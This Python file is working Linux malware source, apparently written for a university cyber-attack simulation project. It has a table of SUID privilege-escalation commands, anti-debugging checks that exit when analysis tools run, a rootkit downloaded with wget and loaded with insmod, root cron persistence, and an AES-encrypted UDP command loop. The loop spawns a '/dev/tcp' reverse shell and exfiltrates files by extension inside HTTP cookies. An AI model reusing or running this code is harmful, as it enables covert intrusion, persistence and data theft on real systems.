import base64
import os
import signal
import socket
import string
import subprocess
import sys
import threading
from os import system
from random import randint, choice
from subprocess import DEVNULL, Popen
from time import sleep

import psutil
import requests
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from crontab import CronTab

AntiDebug = False

NODE_ID = randint(1000, 100000)

IP = "127.0.0.1"
PORT = 53045

BASE_URL = "http://localhost:5000/"

key = bytes.fromhex("926eaa0640299de816d23463ce8ae883")

heartbeat_message = b"heartbeat"

GotExploits = {
    'ash': '',
    'bash': '-pc python3 ~/malware.py',
    'sh': '-p',
    'dash': '-pc ~/malware',
    'zsh': '',
    'busybox': 'sh',
    'docker': 'run -v /:/mnt --rm -it alpine chroot /mnt sh',
    'find': '. -exec /bin/sh -p \\; -quit',
    'perl': '-e \'exec "/bin/sh";\'',
    'php': '-r "pcntl_exec(\'/bin/sh\', [\'-p\']);"',
    'python': '-c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    'vim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
}

default_binaries = ['unopk', 'pux', 'JSONStr', 'chrome-sandbox', 'pppd', 'ssh-keysign',
                    'dbus-daemon-launch-helper',
                    'Xorg.wrap', 'spice-client-glib-usb-acl-helper', 'dmcrypt-get-device', 'polkit-agent-helper-1',
                    'snap-confine', 'fusermount', 'umount', 'su', 'sudo', 'pkexec', 'passwd', 'chsh', 'chfn', 'newgrp',
                    'mount', 'gpasswd', 'mount', 'ping', 'su', 'umount', 'chfn', 'chsh', 'gpasswd', 'newgrp', 'passwd',
                    'sudo', 'dbus-daemon-launch-helper', 'ssh-keysign', 'snap-confine', 'snap-confine', 'chfn', 'chsh',
                    'gpasswd', 'mount', 'newgrp', 'passwd', 'su', 'sudo', 'umount', 'dbus-daemon-launch-helper',
                    'ssh-keysign', 'chfn', 'chsh', 'gpasswd', 'mount', 'newgrp', 'passwd', 'su', 'sudo', 'umount',
                    'dbus-daemon-launch-helper', 'ssh-keysign', 'arping', 'at', 'bwrap']


def build_message(message):
    message_encoded = base64.b64encode(message)
    pre_aes = str(NODE_ID) + "_" + message_encoded.decode()
    plaintext = pre_aes.encode()
    nonce = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, nonce)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    nonce_encoded = base64.b64encode(nonce).decode()
    ciphertext_encoded = base64.b64encode(ciphertext).decode()
    final_output = nonce_encoded + "_" + ciphertext_encoded
    return final_output.encode()


def deconstruct_message(message):
    nonce_encoded, ciphertext_encoded = message.decode().strip().split("_")
    nonce = base64.b64decode(nonce_encoded)
    ciphertext = base64.b64decode(ciphertext_encoded)
    cipher = AES.new(key, AES.MODE_CBC, nonce)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return plaintext.decode()


def get_suid_bins():
    cmd = ['find', '/', '-perm', '-4000', '-type', 'f']
    res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=DEVNULL)
    return res.stdout.decode('unicode_escape').strip().split('\n')


def filter_default(suid_bins):
    custom = []
    for b in suid_bins:
        name = b.split("/")[::-1][0]

        if name not in default_binaries:
            custom.append(b)

    return custom


def exploit_suids(suids):
    exploits = []

    for s in suids:
        name = s.split("/")[::-1][0]

        if name in GotExploits:
            exploit = s + " " + GotExploits[name]
            exploits.append(exploit)

    for exploit in exploits:
        system(exploit)


def privesc():
    # suid_bins = get_suid_bins()
    d = ['/home/john/Documents/Classes/CS590J/final_project/cyber_attack_simulation/dash']
    custom_suids = d
    exploit_suids(custom_suids)


def antidebug():
    global AntiDebug
    black_list_programs = ["binaryninja", "ida", "ghidrarun", "ghidra", "wireshark", "gdb",
                           "valgrind", "objdump", "strings"]

    # Check if we are running in virtual machine, if so, exit
    # if (hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix')
    #                                     and sys.base_prefix != sys.prefix)):
    #     quit()

    # Check if we are running on kali
    output = subprocess.check_output("lsb_release -a", shell=True, stderr=DEVNULL)
    if bytes("Kali", encoding='utf8') in output:
        sys.exit(0)

    AntiDebug = True

    # Check if blacklisted program is running, and if so, exit
    while True:
        sleep(1)

        for program in black_list_programs:
            for proc in psutil.process_iter():
                if program in proc.name() or program in proc.name().lower():
                    sys.exit(0)


def setup_persistence():
    cron = CronTab(user='root')
    job = cron.new(command='/opt/malware.bin')
    job.minute.every(60)
    cron.write()


# For testing, the main program will print out the symmetric key in the beginning,
# paste it below before running


def find_files(directory, extension):
    found_files = []
    for dirpath, dirnames, files in os.walk(os.path.expanduser(directory)):
        for file_name in files:
            if file_name.endswith("." + extension):
                found_files.append(dirpath + "/" + file_name)
    return found_files


def exfil_file(filename):
    with open(filename, 'rb') as f:
        data = f.read()
        name = os.path.basename(f.name)
        url = BASE_URL + ''.join(choice(string.ascii_letters) for _ in range(randint(5, 25)))
        cookie = "b=" + build_message(name.encode()).decode()
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linix x86_64; rv:99.0) Gecko/20100101 Firefox/99.0',
                   'Connection': 'keep-alive', 'Cookie': cookie}
        requests.get(url=url, headers=headers)
        pieces = [data[x:x + 3072] for x in range(0, len(data), 3072)]
        for x in range(0, len(pieces)):
            part = pieces[x]
            url = BASE_URL + ''.join(choice(string.ascii_letters) for _ in range(randint(5, 25)))
            cookie = "b=" + build_message(part).decode()
            if x == len(pieces) - 1:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linix x86_64; rv:99.0) Gecko/20100101 Firefox/99.0',
                           'Connection': 'close', 'Cookie': cookie}
            else:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linix x86_64; rv:99.0) Gecko/20100101 Firefox/99.0',
                           'Connection': 'keep-alive', 'Cookie': cookie}
            requests.get(url=url, headers=headers)


def main():
    global AntiDebug

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client_socket.settimeout(20)

    RKIT_LINK = "http://127.0.0.1:5000/static/rootkit.ko"

    # TODO check if malware is already running, if so quit

    # Start thread to handle anti-debug in the background
    th = threading.Thread(target=antidebug)
    th.daemon = True
    th.start()

    # Make sure anti-debug successfuly completed before continuing execution
    while not AntiDebug:
        pass

    if os.geteuid() != 0:
        # Privilege escalate to root user
        print(os.geteuid())
        privesc()
        pass
    else:
        print(os.geteuid())

        # Install rootkit
        subprocess.run(['wget', RKIT_LINK])
        subprocess.run(['insmod', 'rootkit.ko'], stdout=subprocess.PIPE, stderr=DEVNULL)
        # setup_persistence()
        while True:
            client_socket.sendto(build_message(heartbeat_message), (IP, PORT))
            try:
                recv = client_socket.recvfrom(4096)
            except TimeoutError:
                print("Failed to get a response...")
                continue
            print(recv)
            plaintext = deconstruct_message(recv[0])
            print(plaintext)
            if plaintext.strip() == 'uninstall':
                client_socket.sendto(build_message(b"uninstall ack"), (IP, PORT))
                sleep(1)
                client_socket.close()
                sys.exit(0)
            elif plaintext.strip().startswith("shell"):
                cmd = plaintext.strip().split(" ")
                shell_cmd = "bash -i >& /dev/tcp/" + cmd[1] + "/" + cmd[2] + " 0>&1"
                Popen(shell_cmd, shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
            elif plaintext.strip().startswith("extract"):
                cmd = plaintext.strip().split(" ")
                file_dir = cmd[1]
                file_extension = cmd[2]
                files = find_files(file_dir, file_extension)
                for file in files:
                    exfil_file(file)
            sleep(10)
    # Launch cron job that maintains persistence after reboot

    sys.exit(0)
    # print("starting malware")


if __name__ == "__main__":
    main()
